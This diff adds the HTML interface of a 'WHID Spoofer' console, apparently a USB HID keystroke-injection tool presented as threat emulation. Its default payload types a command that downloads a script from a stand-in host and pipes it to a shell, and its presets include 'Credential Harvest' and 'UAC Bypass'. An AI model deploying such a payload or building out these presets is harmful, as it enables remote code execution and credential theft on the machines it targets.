@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WHID Spoofer</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <div class="bg-grid"></div>
+
+    <div class="app-shell">
+      <aside class="sidebar">
+        <div class="brand">
+          <div class="brand-mark">W</div>
+          <div>
+            <p class="eyebrow">Device Lab</p>
+            <h1>WHID</h1>
+          </div>
+        </div>
+
+        <nav class="side-nav">
+          <button class="nav-item active">Spoofer</button>
+          <button class="nav-item">Profiles</button>
+          <button class="nav-item">Payloads</button>
+          <button class="nav-item">Logs</button>
+        </nav>
+
+        <div class="device-card">
+          <div class="device-title-row">
+            <span class="dot online"></span>
+            <span>Target Link</span>
+          </div>
+
+          <div class="device-status">
+            <div>
+              <small>Mode</small>
+              <strong>USB HID</strong>
+            </div>
+            <div>
+              <small>State</small>
+              <strong>Ready</strong>
+            </div>
+          </div>
+
+          <div class="signal-bar">
+            <span></span><span></span><span></span><span></span>
+          </div>
+        </div>
+      </aside>
+
+      <main class="main-panel">
+        <header class="topbar">
+          <div>
+            <p class="eyebrow subtle">Threat emulation</p>
+            <h2>WHID Spoofer Console</h2>
+          </div>
+          <div class="status-pill">SYSTEM READY</div>
+        </header>
+
+        <section class="panel-grid">
+          <div class="panel control-panel">
+            <div class="panel-header">
+              <h3>Device Profile</h3>
+              <span class="badge accent">Live</span>
+            </div>
+
+            <div class="form-grid">
+              <label>
+                <span>Alias</span>
+                <input id="aliasInput" type="text" value="Kali-USB-07" />
+              </label>
+
+              <label>
+                <span>Vendor ID</span>
+                <input id="vendorInput" type="text" value="0x046D" />
+              </label>
+
+              <label>
+                <span>Product ID</span>
+                <input id="productInput" type="text" value="0xC52B" />
+              </label>
+
+              <label>
+                <span>Serial</span>
+                <input id="serialInput" type="text" value="WHID-2048" />
+              </label>
+            </div>
+
+            <div class="mode-row">
+              <button class="toggle active">USB HID</button>
+              <button class="toggle">BLE</button>
+              <button class="toggle">RF</button>
+            </div>
+
+            <div class="payload-box">
+              <div class="payload-header">
+                <span>Payload</span>
+                <button id="generateBtn" class="mini-button">Generate</button>
+              </div>
+              <textarea id="payloadInput" rows="7">STRING "echo 'pwned' > /tmp/owned"\nENTER\nSTRING "curl -fsSL https://example.com/payload.sh | sh"\nENTER</textarea>
+            </div>
+
+            <div class="action-row">
+              <button id="startBtn" class="primary-btn">Start Spoof</button>
+              <button id="stopBtn" class="ghost-btn">Stop</button>
+            </div>
+          </div>
+
+          <div class="panel metrics-panel">
+            <div class="panel-header">
+              <h3>Session</h3>
+              <span class="badge neutral">Active</span>
+            </div>
+
+            <div class="metric-stack">
+              <div class="metric-card">
+                <small>Preset</small>
+                <strong id="presetName">Admin Shell</strong>
+              </div>
+              <div class="metric-card">
+                <small>Latency</small>
+                <strong>14ms</strong>
+              </div>
+              <div class="metric-card">
+                <small>Packets</small>
+                <strong id="packetCount">412</strong>
+              </div>
+            </div>
+
+            <div class="preset-list">
+              <button class="preset selected" data-preset="Admin Shell">Admin Shell</button>
+              <button class="preset" data-preset="PowerShell">PowerShell</button>
+              <button class="preset" data-preset="Credential Harvest">Credential Harvest</button>
+              <button class="preset" data-preset="UAC Bypass">UAC Bypass</button>
+            </div>
+          </div>
+        </section>
+
+        <section class="bottom-grid">
+          <div class="panel logs-panel">
+            <div class="panel-header">
+              <h3>Run Log</h3>
+              <button class="mini-button alt">Export</button>
+            </div>
+            <ul id="logList" class="log-list">
+              <li><span class="time">00:00:02</span> <span>Device handshake complete</span></li>
+              <li><span class="time">00:00:05</span> <span>Profile loaded: Admin Shell</span></li>
+              <li><span class="time">00:00:09</span> <span>USB descriptor verified</span></li>
+              <li><span class="time">00:00:12</span> <span>Payload queue ready</span></li>
+            </ul>
+          </div>
+
+          <div class="panel mini-panel">
+            <div class="panel-header">
+              <h3>Queue</h3>
+              <span class="badge neutral">4 / 8</span>
+            </div>
+
+            <div class="queue-list">
+              <div class="queue-item done"><span>1</span><p>Handshake</p><small>OK</small></div>
+              <div class="queue-item done"><span>2</span><p>Descriptor</p><small>OK</small></div>
+              <div class="queue-item active"><span>3</span><p>Inject</p><small>RUN</small></div>
+              <div class="queue-item"><span>4</span><p>Verify</p><small>WAIT</small></div>
+            </div>
+          </div>
+        </section>
+      </main>
+    </div>
+
+    <script src="script.js"></script>
+  </body>
+</html>
